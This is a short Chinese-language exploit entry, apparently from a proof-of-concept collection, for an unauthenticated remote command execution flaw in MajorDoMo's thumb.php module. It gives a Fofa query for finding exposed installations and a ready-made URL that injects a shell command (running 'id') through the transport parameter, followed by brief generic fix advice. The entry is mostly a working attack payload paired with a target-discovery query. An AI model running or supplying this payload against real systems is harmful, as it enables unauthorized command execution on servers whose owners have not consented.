# MajorDoMo-thumb未授权远程代码执行漏洞

MajorDoMo ｜ 命令执行 ｜ —
- **指纹**：`app="MajordomoSL"`

**Payload**
```
1. Fofa
app="MajordomoSL"
2、部分界面如下
3、隐患url,复现如下
/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
```
- **其他**：修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。